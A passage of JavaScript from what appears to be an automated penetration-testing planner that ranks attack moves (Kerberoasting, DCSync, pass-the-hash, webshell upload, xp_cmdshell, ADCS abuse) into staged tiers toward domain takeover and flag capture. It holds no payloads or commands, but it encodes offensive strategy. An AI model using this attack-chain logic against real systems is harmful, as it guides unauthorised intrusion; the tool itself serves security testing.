    // service scan, and you hold no foothold or usable credential. In that window a freshly-unlocked recon
    // move (the service scan that deepens the ports you just found) leads the enumeration it feeds. The
    // moment the service scan is done (scan.nmap.version), or you are on the box / hold a working credential,
    // the rule switches off: enumeration and the objective lead, and the optional extras (vuln/UDP/DNS scans)
    // never bury them. This is the "finish your service scan before you dump" discipline and nothing more.
    var earlyRecon = (!haveObj['credential.available'] || onlySpeculativeCrossDomainCred) && !haveObj['scan.nmap.version'];
    if (earlyRecon) for (var _fk in haveObj) { if (/^foothold\./.test(_fk) || /^access\.(shell|admin|system|root|desktop)$/.test(_fk)) { earlyRecon = false; break; } }
    var v2Foothold = false; for (var _hk in haveObj) { if (/^foothold\./.test(_hk) || /^access\.(shell|admin|system|root|desktop)$/.test(_hk)) { v2Foothold = true; break; } }
    // "Validate before use" is live while you hold a usable credential you have not yet proven works (and are not already logged in).
    var selectedIdentityPending = !onlySpeculativeCrossDomainCred && !!(facts.context && facts.context.credentialId && haveObj['credential.available'] && !haveObj['credential.validated']
      && !haveObj['smb.authenticated'] && !haveObj['ldap.authenticated'] && !haveObj['winrm.authenticated']);
    var validateFirst = !onlySpeculativeCrossDomainCred && !!haveObj['credential.available'] && !haveObj['credential.validated'] && (!v2Foothold || selectedIdentityPending) && !haveObj['smb.authenticated'] && !haveObj['ldap.authenticated'] && !haveObj['winrm.authenticated'];
    // "Map and get on the box before you reach for a named misconfiguration." While you hold a credential but
    // have NOT mapped the domain (no attack/control paths, no graph) and have NO foothold yet, a move that
    // EXPLOITS A SPECIFIC named AD misconfiguration (ADCS ESC, a trust hop, SCCM) is premature: you have not
    // confirmed it applies, and it reads as a near-win to the score (it produces a cert / a trust / an SCCM
    // path) so it buries the moves that get you there. Demote those below the moves that map the domain
    // (BloodHound or the manual path-finder), get you a foothold, or do the cheap always-worth-it roast.
    // Self-disables the moment you map (a path/graph fact mints) or land a foothold, so the post-map killchain,
    // where the named abuse IS the next step, is untouched. (ranker-sim.js measures this.)
    var v2Mapped = !!(haveObj['ad.attack_paths'] || haveObj['ad.control_paths'] || haveObj['ad.graph.collected']);
    var specializeHold = !onlySpeculativeCrossDomainCred && !!haveObj['credential.available'] && !v2Mapped && !v2Foothold && !haveObj['adcs.vulnerable'] && !haveObj['db.session'] && !haveObj['mssql.authenticated'];
    var SPECIALIZE_RE = /^(adcs\.vulnerable|credential\.certificate|ad\.trusts|sccm\.)/;
    function isSpecialize(a) { return (a.produces || []).some(function (k) { return SPECIALIZE_RE.test(k); }); }

    function onType(a) {
      if (!focus.length) return 0;
      for (var i = 0; i < a.produces.length; i++) for (var j = 0; j < focus.length; j++) if (String(a.produces[i]).indexOf(focus[j]) === 0) return -1;
      return 0;
    }

    var st = (OBOL.phases && OBOL.phases.evaluateEngagementState) ? OBOL.phases.evaluateEngagementState(facts) : {};
    var hasActiveHighValueLead = !!(haveObj['hash.asrep'] || haveObj['hash.tgs'] || haveObj['hash.ntlm'] || haveObj['ad.acl_lead'] || haveObj['ad.control_paths'] || (!onlySpeculativeCrossDomainCred && haveObj['credential.available']));
    var onlyLowLevelReconFresh = Object.keys(rec.recent || {}).length > 0;
    for (var rk in rec.recent) {
      if (!/^service\.|^ports\.|^port:|^http\.response|^web\.server|^dns\./.test(rk)) {
        onlyLowLevelReconFresh = false; break;
      }
    }

    var hasWinShellSurface = !!(haveObj['foothold.windows'] || haveObj['access.shell'] || haveObj['access.admin'] || haveObj['access.system']
      || haveObj['smb.reachable'] || haveObj['winrm.reachable'] || haveObj['winrm.authenticated'] || haveObj['rdp.reachable']
      || haveObj['port:445'] || haveObj['port:139'] || haveObj['port:5985'] || haveObj['port:5986'] || haveObj['port:3389'] || haveObj['port:22']);
    var isDcBox = !!(haveObj['ad.dc_candidate'] || haveObj['ad.domain_controller']);
    var isAdTarget = !!(haveObj['ad.domain_known'] || isDcBox || haveObj['service.ldap'] || haveObj['port:389'] || haveObj['port:88'] || haveObj['kerberos.reachable'] || haveObj['ldap.reachable']);
    var adMapped = !!(haveObj['ad.graph.collected'] || haveObj['ad.control_paths'] || haveObj['ad.acl_lead'] || haveObj['ad.attack_paths']);
    var inEscalationWindow = !!(haveObj['credential.available'] && !haveObj['access.admin'] && !haveObj['access.system'] && !haveObj['loot.ntds']);

    var hasFtpWebroot = (typeof facts.values === 'function' ? (facts.values('config.review') || []) : []).some(function (v) {
      return v && (v.kind === 'ftp_webroot_exposed' || /ftp_webroot/i.test(String(v.kind || v.summary || '')));
    });
    var hasWordpressCms = (typeof facts.values === 'function') && (
      (facts.values('web.cms') || []).concat(facts.values('web.tech') || []).some(function (v) {
        return v && /wordpress/i.test(String(v.cms || v.name || v.tech || v.app || (Array.isArray(v.tech) ? v.tech.join(' ') : '') || ''));
      })
      || (facts.values('web.paths') || []).some(function (v) {
        var wpArr = (v && (v.paths || v.hits || v.urls)) || (v && v.path ? [v.path] : []);
        return Array.isArray(wpArr) && wpArr.some(function (p) { return /\/wp-(?:login\.php|admin|content|includes)\b/i.test(String((p && p.path) || p || '')); });
      })
    );
    var dbSessionVals = (typeof facts.values === 'function') ? (facts.values('db.session') || []) : [];
    var hasPostgresSession = dbSessionVals.some(function (v) { return v && /postgres/i.test(String(v.engine || v.service || v.tool || '')); })
      || !!(haveObj['db.session'] && (haveObj['service.postgresql'] || haveObj['port:5432'] || haveObj['postgres.reachable']));
    var hasMysqlSession = dbSessionVals.some(function (v) { return v && /mysql|mariadb/i.test(String(v.engine || v.service || v.tool || '')); })
      || !!(haveObj['db.session'] && (haveObj['service.mysql'] || haveObj['port:3306'] || haveObj['mysql.reachable']));
    var hasLivePrivescMove = live.some(function (b) {
      if (b.id === 'windows-enum' || b.id === 'linux-enum' || b.transition === 'privesc_orient') return false;
      if (b.id === 'linux-kernel-exploit' && haveObj['privesc.kernel_exploit']) return true;
      return b.requires_all.concat(b.requires_any).some(function (k) {
        return haveObj[k] && ((/^privesc\./.test(k) && k !== 'privesc.leads') || ACTIONABLE_PRIVESC_VULN_RE.test(k));
      });
    });

    var distCache = Object.create(null);
    var haveAllTruthy = true, baseHave = {};
    for (var _tk in haveObj) {
      baseHave[_tk] = 1;
      if (!haveObj[_tk]) haveAllTruthy = false;
    }
    if (haveAllTruthy) distCache[''] = d0;
    var navG = v2GetGraph(producers);
    var navGoalSet = Object.create(null), navGoalIds = new Array(activeGoals.length);
    var navBaseHasGoal = false;
    for (var _gi = 0; _gi < activeGoals.length; _gi++) {
      var _gk = activeGoals[_gi];
      navGoalSet[_gk] = 1;
      if (baseHave[_gk]) navBaseHasGoal = true;
      var _gfid = navG.factId[_gk];
      navGoalIds[_gi] = _gfid !== undefined ? _gfid : -1;
    }
    var navBaseMemoF = null;
    if (!navBaseHasGoal) {
      navBaseMemoF = v2AllocI32(navG.F);
      v2CopyArr(navBaseMemoF, navG.initMemoF);
      for (var _bhk in baseHave) {
        var _bhid = navG.factId[_bhk];
        if (_bhid !== undefined) navBaseMemoF[_bhid] = 0;
      }
    }

    var blockedPack = [], blockedNewProd = [], blockedByFact = haveAllTruthy ? Object.create(null) : null;
    function indexBlockedFact(fk, bIdx) {
      var arr = blockedByFact[fk];
      if (!arr) { blockedByFact[fk] = [bIdx]; return; }
      if (arr[arr.length - 1] !== bIdx) arr.push(bIdx);
    }
    var hasHaveObjKind = function (k) { return !!haveObj[k]; };
    for (var _bi = 0; _bi < activePack.length; _bi++) {
      var _bm = activePack[_bi];
      if (v2EligAgainst(_bm, haveObj)) continue;
      var _bIdx = blockedPack.length;
      blockedPack.push(_bm);
      var _np = [];
      for (var _pi = 0; _pi < _bm.produces.length; _pi++) {
        var _pk = _bm.produces[_pi];
        if (!baseHave[_pk] && _np.indexOf(_pk) < 0) _np.push(_pk);
      }
      if (_np.length > 1) _np.sort();
      blockedNewProd.push(_np);
      if (blockedByFact) {
        var _ra = _bm.requires_all, _missingAll = false;
        for (var _ri = 0; _ri < _ra.length; _ri++) {
          var _rk = _ra[_ri];
          if (!haveObj[_rk]) {
            if (_rk === 'http.reachable' && hasActionReqKind(_bm, hasHaveObjKind, _rk)) continue;
            indexBlockedFact(_rk, _bIdx);
            if (_rk === 'http.reachable' && _bm.id === 'ftp-webroot-upload-webshell') {
              for (var _hp = 0; _hp < HTTP_SURFACE_PORT_KINDS.length; _hp++) {
                indexBlockedFact(HTTP_SURFACE_PORT_KINDS[_hp], _bIdx);
              }
            }
            _missingAll = true;
            break;
          }
        }
        if (!_missingAll) {
          var _ry = _bm.requires_any;
          for (var _yi = 0; _yi < _ry.length; _yi++) indexBlockedFact(_ry[_yi], _bIdx);
        }
      }
    }
    var seenBlocked = blockedByFact ? v2AllocI32(blockedPack.length) : null, blockedStamp = 0;
    var allBlockedIndices = null;
    if (!blockedByFact) {
      allBlockedIndices = new Array(blockedPack.length);
      for (var _abi = 0; _abi < blockedPack.length; _abi++) allBlockedIndices[_abi] = _abi;
    }
    function numAsc(x, y) { return x - y; }
    function v2MergeSortedDisjoint(xs, ys) {
      var xl = xs.length, yl = ys.length;
      if (!xl) return ys;
      if (!yl) return xs;
      var out = new Array(xl + yl), xi = 0, yi = 0, oi = 0;
      while (xi < xl && yi < yl) {
        if (xs[xi] < ys[yi]) out[oi++] = xs[xi++];
        else out[oi++] = ys[yi++];
      }
      while (xi < xl) out[oi++] = xs[xi++];
      while (yi < yl) out[oi++] = ys[yi++];
      return out;
    }

    var isAdminStage = (st.accessLevel === 'admin' || st.accessLevel === 'system' || st.credTier === 'admin_cred' || haveObj['access.admin'] || haveObj['access.system']);
    var hasGppCand = (haveObj['credential.candidate'] && typeof facts.values === 'function')
      ? facts.values('credential.candidate').some(function (v) { return v && v.kind === 'gpp_cpassword'; })
      : false;
    var inFootholdStage = (st.accessLevel === 'foothold' || haveObj['foothold.linux'] || haveObj['foothold.windows'] || haveObj['access.shell']) && !haveObj['access.root'] && !haveObj['access.admin'] && !haveObj['access.system'];

    var scored = live.map(function (a) {
      var indicated = v2Earned(a, haveObj), i;
      var spec = v2Speculative(a, haveObj);
      var fresh = v2EligAgainst(a, haveObj) && !v2EligAgainst(a, rec.before);

      // Anti-thrash: if the operator already holds a high-value attack lead (hash in hand, DCSync ready,
      // or valid creds), a minor low-level recon ping must not leapfrog the primary attack chain.
      if (fresh && hasActiveHighValueLead && onlyLowLevelReconFresh && (a.phase === 'recon' || a.id.indexOf('scan') >= 0)) {
        fresh = false;
      }
      // Anti-thrash on Domain Controller: generic host LPE / tunnel fallbacks must not leapfrog the AD attack chain
      if (fresh && isDcBox && !adMapped) {
        if (a.dcDefer) {
          fresh = false;
        }
      }

      var tier = (spec && !indicated) ? -1 : (fresh ? 2 : (indicated ? 1 : 0));
      var stageRank = 0;
      var promote = function (t, r) {
        if (t > tier || (t === tier && r > stageRank)) {
          tier = t;
          stageRank = r;
        }
      };

      var h2 = {}, aAdded = [], k;
      for (k in haveObj) h2[k] = 1;
      for (i = 0; i < a.produces.length; i++) {
        var ap = a.produces[i];
        if (!h2[ap]) {
          h2[ap] = 1;
          aAdded.push(ap);
        }
      }
      if (aAdded.length > 1) aAdded.sort();
      var aKey = aAdded.length === 0 ? '' : (aAdded.length === 1 ? aAdded[0] : aAdded.join('\x00'));
      var dH2 = distCache[aKey];
      if (dH2 === undefined) {
        dH2 = navBaseHasGoal ? 0 : v2GoalDistanceDelta(navG, navBaseMemoF, aAdded, null, navGoalSet, navGoalIds);
        distCache[aKey] = dH2;
      }
      var progA = d0 >= V2_INF ? (dH2 >= V2_INF ? 0 : 5) : Math.max(0, d0 - dH2);
      // enablement + keystone in one forward pass over the moves this one unblocks (1-step lookahead):
      //   enable   = the single BEST door a opens (goal-tempered) - the deepest unlock.
      //   keystone = the BREADTH of doors it opens - how many blocked moves become eligible, each tempered
      //              by its reliability and whether it advances toward a goal (0.5 floor for being unblocked
      //              at all). Capped so a fact that unblocks the whole authenticated surface is favoured as
      //              the pivot, without letting raw fan-out dominate a better-progress move.
      var enable = 0, keystone = 0;
      var candIndices;
      if (blockedByFact) {
        if (aAdded.length === 0) {
          candIndices = _V2_EMPTY_I32;
        } else if (aAdded.length === 1) {
          candIndices = blockedByFact[aAdded[0]] || _V2_EMPTY_I32;
        } else {
          var cands = [];
          blockedStamp++;
          for (var ai2 = 0; ai2 < aAdded.length; ai2++) {
            var bl = blockedByFact[aAdded[ai2]];
            if (!bl) continue;
            for (var bli = 0; bli < bl.length; bli++) {
              var candBi = bl[bli];
              if (seenBlocked[candBi] !== blockedStamp) {
                seenBlocked[candBi] = blockedStamp;
                cands.push(candBi);
              }
            }
          }
          if (cands.length > 1) cands.sort(numAsc);
          candIndices = cands;
        }
      } else {
        candIndices = allBlockedIndices;
      }
      for (var ci = 0; ci < candIndices.length; ci++) {
        var bi = candIndices[ci];
        var b = blockedPack[bi];
        if (b.id === a.id || !v2EligAgainst(b, h2)) continue;
        var relB = v2Reliability(b, h2), progB = 0;
        var bProds = blockedNewProd[bi], bOnly = null;
        for (var pi = 0; pi < bProds.length; pi++) {
          var bp = bProds[pi];
          if (!h2[bp]) {
            if (!bOnly) bOnly = [bp];
            else bOnly.push(bp);
          }
        }
        if (bOnly) {
          var abAdded = v2MergeSortedDisjoint(aAdded, bOnly);
          var abKey = abAdded.length === 1 ? abAdded[0] : abAdded.join('\x00');
          var d1 = distCache[abKey];
          if (d1 === undefined) {
            d1 = navBaseHasGoal ? 0 : v2GoalDistanceDelta(navG, navBaseMemoF, aAdded, bOnly, navGoalSet, navGoalIds);
            distCache[abKey] = d1;
          }
          progB = dH2 >= V2_INF ? (d1 >= V2_INF ? 0 : 5) : Math.max(0, dH2 - d1);
        }
        // Escalation-aware lookahead: when a low-privilege credential is already in haveObj, roasting a service
        // ticket (hash.tgs -> crack-tgs) yields an escalated credential even though credential.available is
        // already present as a boolean kind in haveObj.
        if (inEscalationWindow && progB === 0 && !haveObj['hash.tgs'] && a.produces.indexOf('hash.tgs') >= 0 && b.produces.indexOf('credential.available') >= 0) {
          progB = 1;
        }
        enable = Math.max(enable, relB * progB);
        keystone += relB * (0.5 + progB);
      }
      if (keystone > V2_KEYSTONE_CAP) keystone = V2_KEYSTONE_CAP;
      // Keystone is a MIDDLE-GAME term: it helps you reach a winning position, it does not adjudicate the
      // win itself. Once a move directly produces a privilege/goal fact it is a cash-in - rank it by
      // progress + hand-tuned priority (the canonical endgame), never by how many further doors it opens,
      // so e.g. own-domain-pth (PtH, p99) is not displaced by silver-ticket just because forging a ticket
      // also unblocks ticket-reuse.
      var aCashIn = false;
      for (i = 0; i < a.produces.length; i++) if (V2_PRIV[a.produces[i]]) { aCashIn = true; break; }
      // Also suppress keystone for a side-quest the pack deprioritizes in the current state (e.g. the
      // golden/silver/diamond ticket persistence moves once loot.ntds is already held): forging a ticket
      // "unblocks" more moves, but post-win persistence must not out-rank the actual endgame cash-in.
      var aSideQuest = false;
      for (i = 0; i < a.deprioritize_when.length; i++) if (haveObj[a.deprioritize_when[i]]) { aSideQuest = true; break; }
      if (aCashIn || aSideQuest) keystone = 0;

      // Operational risk penalty for blind password spraying without lockout policy or null session
      var frictionMod = 0;
      if (a.transition === 'spray' && !haveObj['policy.lockout'] && !haveObj['smb.null_session']) {
        frictionMod -= 0.5;
      }

      var score = v2Reliability(a, haveObj) * (progA + 0.6 * enable + V2_KEYSTONE_W * keystone) + (onType(a) === -1 ? 0.5 : 0) + frictionMod;
      if (aSideQuest) score -= 5.0;

      // Causal Frontier Tiers (tier in {-1, 0, 1, 2, 3, 4, 5}) and within-tier structural sub-role (stageRank).
      // Replaces the legacy flat tier=2 magic-weight ladder with a strict causal stage hierarchy:
      //   Tier  5: Endgame Cash-In Frontier (root/admin flag capture, DCSync domain takeover, admin shell)
      //   Tier  4: Earned Material / Active Exploitation Lead in Hand (captured hash, ACL lead, GPP/share loot, privesc vector)
      //   Tier  3: Authenticated / Foothold Frontier (local flag, fast 1-step escalation probes, domain graph/manual map, foothold orient)
      //   Tier  2: Pre-Auth Surface Discovery & Fresh Recon Frontier (freshly unlocked moves, active anon AD/web discovery)
      //   Tier  1: Indicated Frontier (evidenced moves from earlier batches)
      //   Tier  0: Baseline Frontier (standard un-indicated moves)
      //   Tier -1: Speculative Frontier (blind CVE/spray gambles without supporting evidence)

      // ---- Tier 5: Endgame Cash-In Frontier ----
      var isDcsyncCashIn = a.transition === 'dcsync' || ((!spec || indicated) && (a.produces.indexOf('loot.ntds') >= 0 || a.produces.indexOf('access.admin') >= 0) && a.requires_all.concat(a.requires_any).some(function (k) {
        return k === 'ad.control_paths' || k === 'ad.domain_control';
      }));
      if (!noFlags && hasWinShellSurface && (isAdminStage || credentialProbeAllowed(a, facts)) && a.transition === 'root_flag_win' && !haveObj['objective.root_flag']) {
        promote(5, 3);
      } else if (!noFlags && (haveObj['access.root'] || haveObj['access.admin'] || haveObj['access.system']) && !haveObj['objective.root_flag'] && a.produces.indexOf('objective.root_flag') >= 0) {
        promote(5, 3);
      }
      if ((haveObj['loot.ntds'] || haveObj['hash.krbtgt']) && !haveObj['access.admin'] && !haveObj['access.system'] && a.id === 'own-domain-pth') {
        promote(5, 2);
      }
      if (st.adPosture === 'dcsync_ready' && !haveObj['loot.ntds'] && !haveObj['access.admin'] && isDcsyncCashIn) {
        promote(5, 2);
      }
      if (!noFlags && (haveObj['access.root'] || haveObj['access.admin'] || haveObj['access.system']) && !haveObj['objective.local_flag'] && a.produces.indexOf('objective.local_flag') >= 0) {
        promote(5, 2);
      }
      if (hasWinShellSurface && isAdminStage && a.transition === 'foothold_win' && !haveObj['access.shell']) {
        promote(5, 1);
      }

      // ---- Tier 4: Earned Material / Active Exploitation Lead in Hand ----
      if (haveObj['hash.tgs'] && a.transition === 'crack_tgs' && !haveObj['loot.ntds']) {
        promote(4, 4);
      }
      if (haveObj['hash.asrep'] && a.transition === 'crack_asrep' && !haveObj['credential.available'] && !haveObj['loot.ntds']) {
        promote(4, 4);
      }
      if (st.credTier === 'crackable_hash' && (!spec || indicated) && (a.transition.indexOf('crack') === 0 || a.produces.indexOf('credential.available') >= 0)) {
        promote(4, 3);
      }
      if (isAdTarget && hasGppCand && !haveObj['credential.available'] && a.transition === 'gpp') {
        promote(4, 4);
      }
      if ((st.adPosture === 'paths_mapped' || haveObj['ad.attack_paths'] || haveObj['ad.acl_lead'] || haveObj['ad.group_joined']) && !haveObj['ad.control_paths'] && !haveObj['ad.domain_control'] && !haveObj['loot.ntds'] && !haveObj['access.admin']) {
        if (a.transition === 'map_acl') promote(4, 3);
        else if (a.id === 'ad-acl-abuse') promote(4, 2);
      }
      if ((haveObj['adcs.vulnerable'] || haveObj['credential.certificate']) && !haveObj['loot.ntds'] && !haveObj['access.admin'] && (a.id === 'adcs-esc' || a.id === 'cert-authenticate')) {
        promote(4, 3);
      }
      if ((haveObj['db.session'] || haveObj['mssql.authenticated'] || haveObj['mssql.sysadmin']) && !haveObj['foothold.windows'] && !haveObj['access.shell'] && !haveObj['access.admin'] && !haveObj['access.system'] && a.id === 'mssql-xp-cmdshell') {
        promote(4, 3);
      }
      if ((hasPostgresSession || (haveObj['db.admin'] && (haveObj['service.postgresql'] || haveObj['port:5432']))) && !v2Foothold && a.id === 'postgres-rce') {
        promote(4, 3);
      }
      if (hasMysqlSession && a.id === 'mysql-loot') {
        promote(3, 3);
      }
      if (hasWordpressCms && !v2Foothold && a.id === 'wordpress') {
        promote((rec.recent['web.cms'] || rec.recent['web.paths'] || rec.recent['web.tech']) ? 3 : 2, 3);
      }
      if (haveObj['service.web_terminal'] && !v2Foothold && a.id === 'web-terminal-foothold') {
        promote(4, 4);
      }
      if (a.id === 'ftp-webroot-upload-webshell' && !v2Foothold && !haveObj['foothold.webshell']) {
        if (hasFtpWebroot) promote(4, 3);
        else if (haveObj['ftp.anon_write'] || haveObj['ftp.authenticated']) promote(3, 2);
      }
      var privescIndicated = (!spec || indicated) && ((a.id === 'linux-kernel-exploit' && !!haveObj['privesc.kernel_exploit']) || a.requires_all.concat(a.requires_any).some(function (k) {
        return haveObj[k] && ((/^privesc\./.test(k) && k !== 'privesc.leads') || ACTIONABLE_PRIVESC_VULN_RE.test(k));
      }));
      if (inFootholdStage && privescIndicated && (a.transition === 'privesc_act' || a.produces.some(function (p) { return V2_PRIV[p] || p === 'credential.available' || p === 'credential.plaintext'; }))) {
        promote(4, 3);
      }
      if (isAdTarget && haveObj['ad.user_list'] && (!haveObj['credential.available'] || onlySpeculativeCrossDomainCred) && !haveObj['hash.asrep'] && a.transition === 'asrep_roast') {
        promote(4, 3);
      }
      if (isAdTarget && (!haveObj['credential.available'] || onlySpeculativeCrossDomainCred) && (haveObj['loot.files'] || haveObj['config.review']) && a.transition === 'gpp') {
        promote(4, 3);
      }
      if (isAdTarget && (!haveObj['credential.available'] || onlySpeculativeCrossDomainCred) && (haveObj['smb.content_accessible'] || haveObj['smb.readable_share'] || haveObj['smb.shares']) && a.transition === 'gpp') {
        promote(4, 2);
      }
      if ((!haveObj['credential.available'] || onlySpeculativeCrossDomainCred) && (haveObj['smb.content_accessible'] || haveObj['smb.readable_share'] || haveObj['smb.shares'] || haveObj['smb.null_session'] || haveObj['smb.guest_session']) && a.transition === 'loot_browse') {
        promote(4, 2);
      }

      // ---- Tier 3: Authenticated / Foothold Frontier ----
      if (validateFirst && (!spec || indicated) && (a.produces.indexOf('credential.validated') >= 0 || credentialProbeAllowed(a, facts))) {
        promote(3, 4);
      }
      if (!noFlags && hasWinShellSurface && (st.credTier === 'domain_user' || (!onlySpeculativeCrossDomainCred && haveObj['credential.available'])) && a.transition === 'user_flag_win' && !haveObj['objective.local_flag']) {
        if (haveObj['access.shell'] || haveObj['foothold.windows'] || haveObj['smb.content_accessible'] || haveObj['smb.readable_share'] || haveObj['smb.authenticated'] || haveObj['winrm.reachable'] || haveObj['port:5985']) {
          promote(3, 4);
        } else {
          promote(3, 1);
        }
      }
      if (haveObj['foothold.linux'] && !haveObj['access.root'] && !haveObj['access.admin']) {
        var isLinuxOrient = (!spec || indicated) && (
          a.transition === 'privesc_orient' ||
          a.id === 'linux-enum' ||
          ((a.produces.indexOf('privesc.sudo_rights') >= 0 || a.produces.indexOf('privesc.suid_candidate') >= 0) && !haveObj['privesc.sudo_rights'] && !haveObj['privesc.suid_candidate'])
        );
        if (!hasLivePrivescMove) {
          if (isLinuxOrient) promote(3, 3);
        } else if (a.transition === 'privesc_orient' || a.id === 'linux-enum') {
          if (tier > 1) tier = 1;
          stageRank = -1;
          score -= 3;
        }
      }
      if (haveObj['foothold.windows'] && !haveObj['access.admin'] && !haveObj['access.system']) {
        if (a.transition === 'privesc_orient' || a.id === 'windows-enum') {
          if (!hasLivePrivescMove) {
            promote(3, (isAdTarget && !adMapped) ? 0 : 3);
          } else {
            if (tier > 1) tier = 1;
            stageRank = -1;
            score -= 3;
          }
        }
      }
      if (isAdTarget && !onlySpeculativeCrossDomainCred && haveObj['credential.available'] && a.transition === 'kerberoast' && !haveObj['hash.tgs'] && st.adPosture !== 'dcsync_ready' && !haveObj['loot.ntds']) {
        promote(3, 3);
      }
      if ((st.credTier === 'domain_user' || (!onlySpeculativeCrossDomainCred && haveObj['credential.available']) || haveObj['credential.validated']) && isAdTarget && !adMapped) {
        if (a.transition === 'map_acl') promote(3, 3);
        else if (a.transition === 'map_graph') promote(3, 2);
        else if (a.transition === 'map_manual') promote(3, 1);
      }
      if (hasWinShellSurface && (st.credTier === 'domain_user' || (!onlySpeculativeCrossDomainCred && haveObj['credential.available'])) && !haveObj['access.shell'] && !haveObj['foothold.windows'] && a.transition === 'foothold_win') {
        promote(3, 1);
      }

      // ---- Tier 2: Pre-Auth Surface Discovery & Fresh Recon Frontier ----
      if (!isAdTarget && haveObj['http.reachable'] && haveObj['scan.nmap.version'] && !haveObj['foothold.linux'] && !haveObj['foothold.windows']) {
        var isPrimaryWebDiscovery = (
          a.id === 'content-discovery' || a.id === 'web-content-discovery' || a.id === 'gobuster-dir' ||
          a.id === 'ffuf-dir' || a.id === 'feroxbuster-dir' || a.id === 'check-web-components' ||
          a.id === 'recon-web-triage' || a.id === 'whatweb-fingerprint'
        );
        if (isPrimaryWebDiscovery) promote(2, 2);
      }
      if (isAdTarget && !haveObj['ad.user_list'] && !haveObj['credential.available'] && !haveObj['foothold.windows'] && !haveObj['access.shell']) {
        if (a.id === 'recon-smb-anon' || a.id === 'ad-anon-ldap-enum' || a.id === 'ad-user-enum') {
          if (haveObj['scan.nmap.version'] || tier >= 2) promote(2, 2);
          else promote(tier, 2);
        } else if (a.id === 'mitm6-ipv6-takeover' || a.id === 'responder-poison' || a.id === 'ntlm-relay-attack' || a.id === 'timeroasting' || a.id === 'check-subdomain-takeover' || a.id === 'check-dns-email') {
          if (tier > 0) tier = 0;
          stageRank = -1;
        } else if (a.id === 'nmap-vuln-scripts' && haveObj['scan.nmap.version']) {
          stageRank = -1;
        }
      }

      // Demote AD-specific transitions on non-AD targets
      var isAdSpecific = (
        a.transition === 'gpp' || a.transition === 'kerberoast' || a.transition === 'asrep_roast' ||
        a.transition === 'dcsync' || a.transition === 'map_acl' || a.transition === 'map_graph' ||
        a.transition === 'map_manual' ||
        a.id === 'ad-dc-identify' || a.id === 'ad-user-enum' ||
        a.id === 'gpp-passwords' || a.id === 'ad-path-manual' || a.id === 'bloodhound-collect' ||
        a.id === 'ad-recycle-bin-enum' || a.id === 'kerberoast' || a.id === 'asrep-roast' ||
        a.id === 'dcsync' || a.id === 'powerview-enum' || a.id === 'adcs-esc' ||
        a.id === 'sccm-enum' || a.id === 'sccm-exploit' || a.id === 'ad-legacy-enum' ||
        a.id === 'ad-psdotnet-enum' || a.id === 'adidns-abuse' || a.id === 'azuread-connect-dump' ||
        a.id === 'timeroasting' || a.id === 'kerberos-relay' || a.id === 'trust-enum' ||
        a.id === 'wsus-abuse' || a.id === 'coerce-auth' || a.id === 'printnightmare' ||
        a.id === 'responder-poison' || a.id === 'ntlm-relay-attack' || a.id === 'mitm6-ipv6-takeover' || a.id === 'certifried'
      );
      if (!isAdTarget && isAdSpecific) {
        tier = -1;
        stageRank = -1;
        score -= 20;
      }

      // Demote Windows shell moves when no Windows shell surface exists, or demote win-interactive-shell
      // when root flag capture / domain PtH is already unlocked.
      if (!hasWinShellSurface && (a.id === 'flag-hunt-windows' || a.id === 'win-interactive-shell')) {
        tier = -1;
        stageRank = -1;
        score -= 10;
      } else if (a.id === 'win-interactive-shell' && (haveObj['access.admin'] || haveObj['access.system'] || haveObj['loot.ntds'])) {
        if (tier > 2) tier = 2;
        stageRank = -1;
        score -= 5;
      }

      // When admin/system/root is held, deprioritize user flag-hunt below root flag-hunt
      if (a.id === 'flag-hunt-windows' && (haveObj['access.admin'] || haveObj['access.system']) && !haveObj['objective.root_flag']) {
        if (tier >= 5 && stageRank >= 2) stageRank = 1;
        score -= 2;
      }
      if (a.id === 'flag-hunt-linux' && (haveObj['access.admin'] || haveObj['access.root']) && !haveObj['objective.root_flag']) {
        if (tier >= 5 && stageRank >= 2) stageRank = 1;
        score -= 2;
      }

      if (onlySpeculativeCrossDomainCred) {
        var needsSpecCred = a.id === 'validate-credential'
          || a.requires_all.indexOf('credential.available') >= 0
          || (a.requires_any.indexOf('credential.available') >= 0 && !a.requires_any.some(function (rk) { return rk !== 'credential.available' && haveObj[rk]; }));
        if (needsSpecCred) {
          if (tier > 0) tier = 0;
          stageRank = -1;
          score -= 3;
        }
      }

      // Invariant: unindicated speculative moves stay in tier -1
      if (spec && !indicated && tier > -1) {
        tier = -1;
        stageRank = -1;
      }

      // Endgame objective pull: a reachable, still-uncaptured flag is the box's actual objective - surface it
      // over keystone-rich enumeration even after another goal (e.g. the user flag) already zeroed the
      // goal-distance. See V2_OBJECTIVE_W.
      if (!noFlags) {
        for (i = 0; i < a.produces.length; i++) { if (V2_OBJECTIVE_RE.test(a.produces[i]) && !haveObj[a.produces[i]]) { score += V2_OBJECTIVE_W; break; } }
      }
      return { a: a, tier: tier, stageRank: stageRank, score: score };
    });
    scored.sort(function (x, y) {
      if (y.tier !== x.tier) return y.tier - x.tier;
      // A shell earned as another account cannot validate the selected identity.
      if (selectedIdentityPending) {
        var xv = x.a.produces.indexOf('credential.validated') >= 0 || credentialProbeAllowed(x.a, facts), yv = y.a.produces.indexOf('credential.validated') >= 0 || credentialProbeAllowed(y.a, facts);
        if (xv !== yv) return xv ? -1 : 1;
      }
      // Explore-vs-Exploit, expressed as data: in the opening, lead with the
      // high-information DIAGNOSTICS that collapse the search tree, in order
      //   service scan (produces scan.nmap.version)  >  other diagnostic:true
      //   openers (AD orient, SMB-anon, web triage, SNMP, SMTP-enum)  >  the rest.
      if (earlyRecon && x.tier === 2 && y.tier === 2) {
        var dx = x.a.produces.indexOf('scan.nmap.version') >= 0 ? 0 : (x.a.diagnostic ? 1 : 2);
        var dy = y.a.produces.indexOf('scan.nmap.version') >= 0 ? 0 : (y.a.diagnostic ? 1 : 2);
        if (dx !== dy) return dx - dy;
        if (dx === 1 && dy === 1) {
          var ex = x.a.eliminates.length, ey = y.a.eliminates.length;
          if (ex !== ey) return ey - ex;
        }
      }
      // Validate before use: while you hold a credential you have not validated yet (a FOUND credential,
      // not a cracked one), the step that CONFIRMS it authenticates leads over the moves that spend it.
      if (validateFirst) {
        var xcv = x.a.produces.indexOf('credential.validated') >= 0 || credentialProbeAllowed(x.a, facts), ycv = y.a.produces.indexOf('credential.validated') >= 0 || credentialProbeAllowed(y.a, facts);
        if (xcv !== ycv) return xcv ? -1 : 1;
      }
      // Map / foothold before a named-misconfiguration abuse (see specializeHold above): in this opening a
      // specialize move sorts after everything that is not one, so the domain map, the foothold and the
      // roasts lead and the ADCS/trust/SCCM lanes wait until you have confirmed the ground.
      if (specializeHold) {
